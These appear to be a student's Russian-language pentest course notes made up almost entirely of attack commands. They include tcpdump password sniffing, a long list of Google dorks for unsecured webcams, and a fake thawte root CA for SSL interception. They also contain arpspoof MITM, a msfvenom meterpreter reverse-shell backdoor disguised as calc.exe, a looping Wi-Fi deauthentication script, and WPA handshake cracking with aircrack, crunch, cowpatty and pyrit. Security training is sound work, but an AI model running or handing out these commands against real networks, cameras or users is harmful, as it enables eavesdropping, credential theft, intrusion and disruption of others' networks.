# 1. Урок

```cmd
tcpdump -i any -nnvv dst port 23 -w /tmp/test.pcap
tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20
```

# 2. Урок

```cmd
https://www.google.ru/#q=filetype:pdf+site:geekbrains.ru

будет список Pdf файлов на сайте

Cпособ находить незащищенные веб–камеры, подключенные к сети:

Вводим в гугле «inurl:CgiStart?page=Single»

inurl:"ViewerFrame?Mode="

inurl:netw_tcp.shtml

intitle:"supervisioncam protocol"

inurl:CgiStart?page=Single

inurl:indexFrame.shtml?newstyle=Quad

intitle:liveapplet inurl:LvAppl

inurl:/showcam.php?camid

inurl:video.cgi?resolution=

inurl:image?cachebust=

intitle:"Live View / — AXIS"

inurl:view/view.shtml

intext:"MOBOTIX M1"

intext:"Open Menu"

intitle:snc–rz30

inurl:home/

inurl:"MultiCameraFrame?Mode="

intitle:"EvoCam" inurl:"webcam.html"

intitle:"Live NetSnap Cam–Server feed"

intitle:"Live View / — AXIS 206M"

intitle:"Live View / — AXIS 206W"

intitle:"Live View / — AXIS 210"

inurl:indexFrame.shtml Axis

inurl:"ViewerFrame?Mode="

inurl:"MultiCameraFrame?Mode=Motion"

intitle:start inurl:cgistart

intitle:start inurl:cgistart

intext:"MOBOTIX M1" intext:"Open Menu"

intext:"MOBOTIX M10" intext:"Open Menu"

intext:"MOBOTIX D10" intext:"Open Menu"

intitle:snc–z20 inurl:home/

intitle:snc–cs3 inurl:home/

intitle:snc–rz30 inurl:home/

intitle:"sony network camera snc–p1"

intitle:"sony network camera snc–m1"

site:.viewnetcam.com – http://www.viewnetcam.com

intitle:"Toshiba Network Camera" user login

intitle:"netcam live image"

intitle:"i–Catcher Console — Web Monitor"

inurl:/home/home

\"TOSHIBA Network Camera — User Login\"

inurl:home/homeJ.html

inurl:"ViewerFrame?Mode="

inurl:netw_tcp.shtml

intitle:"supervisioncam protocol"

inurl:CgiStart?page=Single

inurl:indexFrame.shtml?newstyle=Quad

intitle:liveapplet inurl:LvAppl

inurl:/showcam.php?camid

inurl:video.cgi?resolution=

inurl:image?cachebust=

intitle:"Live View / — AXIS"

inurl:view/view.shtml

intext:"MOBOTIX M1"

intext:"Open Menu"

intitle:snc–rz30

inurl:home/

inurl:"MultiCameraFrame?Mode="

intitle:"EvoCam" inurl:"webcam.html"

intitle:"Live NetSnap Cam–Server feed"

intitle:"Live View / — AXIS 206M"

intitle:"Live View / — AXIS 206W"

intitle:"Live View / — AXIS 210"

inurl:indexFrame.shtml Axis

inurl:"ViewerFrame?Mode="

inurl:"MultiCameraFrame?Mode=Motion"

intitle:start inurl:cgistart

intitle:"WJ–NT104 Main Page"

intext:"MOBOTIX M1" intext:"Open Menu"

intext:"MOBOTIX M10" intext:"Open Menu"

intext:"MOBOTIX D10" intext:"Open Menu"

intitle:snc–z20 inurl:home/

intitle:snc–cs3 inurl:home/

intitle:snc–rz30 inurl:home/

intitle:"sony network camera snc–p1"

intitle:"sony network camera snc–m1"

site:.viewnetcam.com – http://www.viewnetcam.com

intitle:"Toshiba Network Camera" user login

intitle:"netcam live image"

intitle:"i–Catcher Console — Web Monitor"

inurl:/home/home

Google Hacks and Webcams

Just click the blue 'google' to do a search with the cam string.

: I found out how they call these search strings: Google Hacks. I wasn't the first one. :)

Especially the last Axis cam string is cool: you can find hundreds of Axis cams with it!

Axis cameras:

"adding live video to one of your own pages a very easy task with an AXIS 2100 Network Camera" [link=http://www.google.com/search?q=%22adding%20live%20video%20to%20one%20of%20your%20own%20pages%20a%20very%20easy%20task%20with%20an%20AXIS%202100%20Network%20Camera%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

intile:"Live view - / - AXIS" [link=http://www.google.com/search?q=intitle:%22Live%20view%20-%20/%20-%20AXIS%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

"Your browser has JavaScript turned off.For the user interface to work effectively" [link=http://www.google.com/search?q=%22Your%20browser%20has%20JavaScript%20turned%20off.For%20the%20user%20interface%20to%20work%20effectively%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

inurl:indexFrame.html axis [link=http://www.google.com/search?q=inurl:indexFrame.html%20axis&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

"Live web imaging unleashed" [link=http://www.google.com/search?q=%22Live%20web%20imaging%20unleashed%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

MOBOTIX cameras:

(intext:"MOBOTIX M1" | intext:"MOBOTIX M10") intext:"Open Menu" Shift-Reload [link=http://www.google.com/search?q=%28intext:%22MOBOTIX%20M1%22%20%7C%20intext:%22MOBOTIX%20M10%22%29%20intext:%22Open%20Menu%22%20Shift-Reload&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

JVC cameras:

"(c)copyright 1999-2003 VICTOR COMPANY OF JAPAN, LIMITED. All rights reserved" [link=http://www.google.com/search?q=%22%28c%29copyright%201999-2003%20VICTOR%20COMPANY%20OF%20JAPAN,%20LIMITED.%20All%20rights%20reserved%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link] (- finaly I got to know the

meaning of the letters in the brand name JVC :)

"V.Networks [Motion Picture(Java)" [link=http://www.google.com/search?q=%22V.Networks%20%5BMotion%20Picture%28Java%29%22&hl=en&amp;filter=0&num=10&lr=all&cr=&source=ggsearch]'google'[/link]

"Control the Pan/Tilt and move to the Preset Position" [link=http://www.google.com/search?q=%22Control%20the%20Pan/Tilt%20and%20move%20to%20the%20Preset%20Position%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

FlexWatch cameras:

inurl:app/idxas.html [link=http://www.google.com/search?q=inurl:app/idxas.html&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

"Saving & Retrieving Mode" [link=http://www.google.com/search?q=%22Saving%20%26%20Retrieving%20Mode%22&hl=en&filter=0&num=10&lr=all&cr=&source=ggsearch] 'google'[/link]

TOSHIBA cameras (maybe you need Java):

"TOSHIBA Network Camera - User Login" [link=http://www.google.com/search?q=%22TOSHIBA%20Network%20Camera%20-%20User%20Login%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

webcamXP (software):

intitle:my webcamXP server! [link=http://www.google.com/search?q=intitle:my%20webcamXP%20server%21&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

Panasonic cameras:

inurl:ViewerFrame?Mode=Motion [link=http://www.google.com/search?q=inurl:ViewerFrame?Mode=Motion&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google [/link]'

Canon cameras:

inurl:sample/LvAppl/ [link=http://www.google.com/search?q=inurl:sample/LvAppl/&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

Sony cameras:

inurl:home/homeJ.html [link=http://www.google.com/search?q=inurl:home/homeJ.html&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

Axis cameras:

inurl:view/view.shtml axis [link=http://www.google.com/search?q=inurl:view/view.shtml%20axis&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

newest! This search string beats them all: you can find hundreds of Axis cams with it. With thanks to I'm Johnny. I hack stuff: intitle:"Live View / - AXIS" | inurl:view/view.shtml[link=http://www.google.com/search?q=intitle:%22Live%20View%20/%20-%20AXIS%22%20%7C%20inurl:view/view.shtml&hl=en&amp;filter=0&num=100&lr=&cr=&source=ggsearch] 'google'[/link]

newer:

D-Link cameras:

inurl:main/flashLogin.html [link=http://www.google.com/search?q=inurl:main/flashLogin.html&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

Linksys cameras:

inurl:next_file=main_fs.htm [link=http://www.google.com/search?q=inurl:next_file=main_fs.htm&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch]'google[/link]'

WebEye cameras:

inurl:/login.ml intitle:User [link=http://www.google.com/search?q=inurl:/login.ml%20intitle:User&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

"Webthru User Login" [link=http://www.google.com/search?q=%22Webthru%20User%20Login%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

"Please enter username and password to log in to system" [link=http://www.google.com/search?q=%22Webthru%20User%20Login%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

Eltis network cameras:

inurl:Ctl/index.htm?Cus [link=http://www.google.com/search?q=inurl:Ctl/index.htm?Cus&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

Stardot cameras:

Configuration "Pop-up Live Image" [link=http://www.google.com/search?q=Configuration%20%22Pop-up%20Live%20Image%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

mainly Panasonic cameras:

inurl:"*.viewnetcam.com" [link=http://www.google.com/search?q=inurl:%22*.viewnetcam.com%22&hl=en&amp;filter=0&num=100&lr=all&cr=&source=ggsearch] 'google'[/link]

TrackerCam (cam-pod hardware):

inurl:Remote/index.php3 intitle:Live Video [link=http://www.google.com/search?q=inurl:Remote/index.php3%20intitle:Live%20Video&hl=en&amp;filter=1&num=100&lr=all&cr=&source=ggsearch]'google'[/link]

More:

inurl:"view/indexFrame.shtml"

inurl:"view/index.shtml"

intitle:axis camera

intitle:"snc-rz30 home"

inurl:"ViewerFrame?Mode=Motion"

inurl:LvAppl intitle:liveapplet

intitle:"Live View / - AXIS"

"Powered by webcamXP"

inurl:indexFrame.shtml "Axis Video Server"

MOBOTIX M1" and "open menu"

intitle:flexwatch

intext:"Copyright by Seyeon TECHCo"

intitle:"WJ-NT104 Main"

inurl:"axis-cgi/mjpg" sample/LvAppl/ inurl:home/homeJ.html

inurl:main/flashLogin.html

inurl:next_file=main_fs.htm inurl:/login.ml

intitle:User "Webthru User Login"

"Please enter username and password to log in to system" inurl:Ctl/index.htm?Cus Configuration "Pop-up Live Image"

inurl:"*.viewnetcam.com" inurl:Remote/index.php3

intitle:Live Video

"TOSHIBA Network Camera - User Login"

http://www.opentopia.com/hiddencam.php

http://www.opentopia.com/showcam.php?camid=616
```

# 3. Урок

```cmd
-t или --table, определяет таблицу правил используемых файрволом.

Так как в зависимости от типа пакета будет осуществляться то или иное действие.

nat - тип таблицы используется, когда встречается пакет, устанавливающий новое соединение

То есть он отлавливает пакеты которые проходят транзитом при условии что он видит в пакете порт назначения 80.

-A указывает на то что нужно добавить правило в конец цепочки prerouting, которая в свою очередь определяет что нужно изменить входящие пакеты.

И вернуть их в качестве ответа Клиенту указав ему что работать будет с ним сервер по http а не https
```

```cmd
#!/bin/bash

openssl genrsa -out ca.key 4096

openssl req -new -x509 -days 7000 -key ca.key -out ca.crt -subj "/C=US/O=thawte, Inc./OU=Certification Services Division/OU=(c) 2006 thawte,Inc -For authorized use only/CN=thawte Primary Root CA"
```


# 4. Урок

```cmd
arpspoof -i eth0 -c both -t 192.168.5.217 -r 192.168.5.5

??? openssl x509 -req -days 365 -in server.csr -sign key.key -out server.crt
openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
```

# 5. Урок

```cmd
https://habr.com/ru/company/ruvds/blog/343612/
https://www.metasploit.com/
https://xakep.ru/2012/10/04/windows-users-pass-dump/
https://habr.com/ru/company/echelon/blog/337824/
https://www.offensive-security.com/reports/sample-penetration-
testing-report.pdf


root@kali:~# msfconsole
msf > msfvenom -l encoders

msf > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101
LPORT=443 -x /tmp/backdoor.exe -e x86/shikata_ga_nai -i 200 -f exe > tmp/calc.exe
```

# 6. Урок

```cmd
#!/bin/bash

echo "--->Переключение интерфейса в режим мониторига<---"

echo "1. Ввод имя интерфейса: "

echo "2. Выбрать интерфейс автоматически!"

read user_input

case $user_input in

1)

echo "Указать интерфейс: "

read interface

;;

2)

interface=`ip a | grep wl* | awk '{print $2}' | cut -d ':' -f1`

echo "$interface"

;;

esac

function control() {

iw mon0 del

systemctl start NetworkManager

clear

exit

}

echo "Вы указали интерфейс: >>$interface<<"

echo "Начать атаку? (y/n): "

read user_input2

if [[ $user_input2 == "y" || $user_input2 == "Y" ]];

then

iw $interface interface add mon0 type monitor

ifconfig mon0 up

echo "Вам известно BSSID точки доступа? (y/n):"

read user_input3

if [[ $user_input3 == "y" || $user_input3 == "Y" ]];

then

echo "Укажите BSSID:"

read bssid

else

echo "Вывожу список точек доступа! Для отмены нажмите [Ctrl-C]"

sleep 2

airodump-ng mon0

echo "Выберите BSSID:"

read bssid

fi

echo "Для атаки на определенного клиента необходимо указать его MAC адрес"

echo "Хотите указать MAC устройства клиента? (y/n):"

read user_input4

if [[ $user_input4 == "y" || $user_input4 == "Y" ]];

then

echo "Если Вам не известен MAC адрес клиента нажмите (n). Если известен нажмите (y)"

read user_input5

if [[ $user_input5 == "n" || $user_input5 == "N" ]];

then

echo "Вывожу на экран мониторинг выбраной точки доступа! Для окончания мониторинга нажмите [Ctrl-C]"

sleep 2

airodump-ng mon0 --bssid=$bssid

echo "Укажите MAC адрес выбранного клиента:"

read mac_client

valid_mac='^([0-9a-fA-F][0-9a-fA-F]:){5}([0-9a-fA-F][0-9a-fA-F])$'

if [[ ! $mac_client =~ $valid_mac ]];

then

echo "Вы неуказали mac адрес!"

echo "Укажите mac!"

read mac_client

trap control SIGINT

trap control SIGTERM

for i in {1..1000}

do

aireplay-ng --deauth 1000 -a $bssid -c $mac_client mon0 --ignore-negative-one

sleep 10

done

else

trap control SIGINT

trap control SIGTERM

for i in {1..1000}

do

aireplay-ng --deauth 1000 -a $bssid -c $mac_client mon0 --ignore-negative-one

sleep 10

done

fi

elif [[ $user_input5 == "y" || $user_input == "Y" ]];

then

echo "Начало атаки на точку доступа без указания клиента!"

trap control SIGINT

trap control SIGTERM

for i in {1..1000}

do

aireplay-ng --deauth 1000 -a $bssid mon0 --ignore-negative-one

sleep 10

done

else

echo "Выбор указан не верно!"

fi

else

echo "Начало атаки на точку доступа без указания клиента!"

trap control SIGINT

trap control SIGTERM

for i in {1..1000}

do

aireplay-ng --deauth 1000 -a $bssid mon0 --ignore-negative-one

sleep 10

done

fi

else

echo "Досвидание!"

fi
```

```cmd
Взлом wifi

Теперь рассмотрим программы для пентеста wifi

Набор инструментов air (вводим в командной строке)

airmon

airodump (показать на примере картинки если не получиться настроить

внешний usb адаптер)

Если пользователь сидит на точке давно может потребовать чтобы он

переподключился airreplay

Потом нужно словить handshake, потом нужно расшифровать.

Если при использовании airodump видно что на каких-то точках

используется wps (пинкод - 8 цифр всегда, 1 цифра для чексумм,

у некоторых pixie dust), то можно реализовать это с помощью Reaver

Протестируем живой ли дамп cowpatty -r /media/shr/wpa.full.cap -c

Для удобства работы с дампом его лучше очистить wpaclean -h

Смотри BSSID в дампе airckrack-ng /media/shr/wpa.full.cap

Взлом через aircrack-ng -w /media/shr/Dicts/rockyou.txt -b 00:14:6c:7e:40:80 /media/shr/wpa.full.cap

crunch 11 11 -t 7903876%%%% /tmp/mob_dict

rainbow table - cowpatty or pyrit

Сопоставляет хэш essid и варианты из словаря

Генерим радужку

genpmk -f ...dict/rockyou.txt -d /tmp/rainbow -s teddy

Применяем радужку

cowpatty -d /media/shr/Dicts/rain_teddy2 -r /media/shr/wpa.full.cap -s teddy

pyrit -h

pyrit -r ../wpa.full.cap analyze проверить живой дамп или нет

Есть онлайн сервисы как услуга по расшифровке паролей

pyrit -r ../wpa.full.cap -i ../rain_teddy attack_cowpatty

wifi-honey - ханипот для беспроводных точек доступа

open wep wpa wpa2
```


# 7. Урок

```cmd
#!/bin/bash
for i in {1…10000}
do
aireplay-ng -deauth 1000 -a Aa:Bb:Cc:Dd:Ee:Ff wlan0mon
sleep 5s
done


aireplay-ng 0 0 -a Aa:Bb:Cc:Dd:Ee:Ff wlan0mon


https://xakep.ru/2008/05/08/43524/#toc05.
https://forum.antichat.ru/threads/35750/
https://www.securitylab.ru/news/215535.php
https://habr.com/ru/company/cloud4y/blog/337782/
https://github.com/mailinneberg/BlueBorne
https://www.bluetooth.com/specifications/assigned-numbers/
service-discovery/
https://ru.wikipedia.org/wiki/%D0%91%D0%BB%D1%8E
%D0%B4%D0%B6%D0%B5%D0%BA%D0%B8%D0%BD%D0%B3
https://habr.com/ru/company/cloud4y/blog/336614/
https://habr.com/ru/post/337780/
https://thehackernews.com/2019/08/bluetooth-knob-
vulnerability.html
https://www.opennet.ru/opennews/art.shtml?num=51303
```
